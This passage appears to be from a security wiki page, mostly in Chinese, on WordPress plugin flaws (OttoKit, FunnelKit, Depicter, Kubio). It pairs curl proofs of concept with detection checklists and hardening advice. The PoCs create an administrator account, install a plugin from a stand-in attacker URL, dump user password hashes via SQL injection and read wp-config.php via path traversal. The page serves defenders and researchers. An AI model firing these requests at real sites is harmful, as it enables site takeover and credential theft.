- Removed the insecure fallback from $_POST['id']; $user_email must originate from verified provider branches in switch($_POST['using']).

## Unauthenticated privilege escalation via REST token/key minting on predictable identity (OttoKit/SureTriggers ≤ 1.0.82)

一些插件暴露 REST endpoints，会铸造可重用的 “connection keys” 或 tokens，而不验证调用者的 capabilities。如果路由仅对可猜测的属性（例如 username）进行认证，且没有将 key 绑定到带有 capability checks 的 user/session，任何未经认证的攻击者都可以铸造一个 key 并调用有特权的操作（创建 admin 账号、插件操作 → RCE）。

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC – mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# → {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
为何可被利用
- 敏感的 REST 路由仅由低熵的身份凭证（username）或缺失的 permission_callback 保护
- 没有 capability 强制；生成的密钥被当作通用绕过

检测清单
- 使用 grep 在插件代码中搜索 register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- 任何基于请求提供的身份（username/email）发放 tokens/keys 的路由，且未绑定到已认证用户或 capability
- 查找后续路由，它们在没有服务器端 capability 检查的情况下接受生成的 token/key

加固
- 对于任何有特权的 REST 路由：要求 permission_callback 强制执行 current_user_can() 来检查所需的 capability
- 不要基于客户端提供的身份发放长期有效的密钥；如确有必要，应在认证后发放短期、绑定用户的 tokens，并在使用时重新检查 capability
- 验证调用者的用户上下文（仅调用 wp_set_current_user 不足以证明）并拒绝满足 !is_user_logged_in() || !current_user_can(<cap>) 的请求

---

## Nonce gate misuse → 未认证的任意插件安装 (FunnelKit Automations ≤ 3.5.3)

Nonces 是用来防止 CSRF 的，不是用来做授权。如果代码将 nonce 验证通过视为通行证，然后跳过对特权操作（例如 install/activate plugins）的 capability 检查，未认证的攻击者可以满足一个弱 nonce 要求并通过安装带后门或存在漏洞的插件达到 RCE。

- Vulnerable path: plugin/install_and_activate
- Flaw: weak nonce hash check; no current_user_can('install_plugins'|'activate_plugins') once nonce “passes”
- Impact: full compromise via arbitrary plugin install/activation

PoC（具体形式取决于插件；仅作示例）
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
检测清单
- 修改插件/主题的 REST/AJAX 处理程序仅使用 wp_verify_nonce()/check_admin_referer()，且没有权限检查
- 在 nonce 验证之后将 $skip_caps = true 的任何代码路径

加固
- 始终仅将 nonces 视为 CSRF tokens；不论 nonce 状态如何，都要强制执行权限检查
- 在到达安装器代码之前，要求 current_user_can('install_plugins') 和 current_user_can('activate_plugins')
- 拒绝未认证访问；避免为高权限流程暴露 nopriv AJAX actions

---

## depicter-* actions 中通过 s (search) 参数触发的未认证 SQLi（Depicter Slider ≤ 3.6.1）

多个 depicter-* actions 使用了 s (search) 参数，并将其拼接进 SQL 查询，未使用参数化。

- 参数：s (search)
- 缺陷：在 WHERE/LIKE 子句中直接进行字符串拼接；未使用预处理语句或输入清理
- 影响：数据库数据外泄（用户、哈希），可能导致横向移动

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
检测清单
- grep 查找 depicter-* action handlers 并检查在 SQL 中直接使用 $_GET['s'] 或 $_POST['s']
- 审查传入 $wpdb->get_results()/query() 且对 s 进行拼接的自定义查询

加固
- 始终使用 $wpdb->prepare() 或 wpdb 占位符；在服务器端拒绝意外的元字符
- 为 s 添加严格的允许列表并规范化为预期的字符集/长度

---

## 无需认证的 Local File Inclusion（通过未验证的 template/文件路径） (Kubio AI Page Builder ≤ 2.5.1)

在 template 参数中接受可被攻击者控制的路径而不进行规范化/限制，会允许读取任意本地文件；如果将可被包含的 PHP 或 log 文件拉入运行时，某些情况下甚至可能导致代码执行。

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: 没有规范化/允许列表；允许遍历
- Impact: 敏感信息泄露 (wp-config.php)，在特定环境下可能导致 RCE（log poisoning、可被包含的 PHP）

PoC – 读取 wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Detection checklist
- 任何将请求路径拼接到 include()/require()/read sink 的处理程序，且未使用 realpath() 进行包含限制
- 寻找到达预期 templates 目录之外的遍历模式 (../)

Hardening
- 强制使用白名单模板；使用 realpath() 解析并要求 str_starts_with(realpath(file), realpath(allowed_base))
- 规范化输入；拒绝目录遍历序列和绝对路径；仅在文件名上使用 sanitize_file_name()（不要用于完整路径）


## References

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025’s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ≤ 1.0.82 – Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ≤ 3.5.3 – Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ≤ 3.6.1 – Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ≤ 2.5.1 – Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
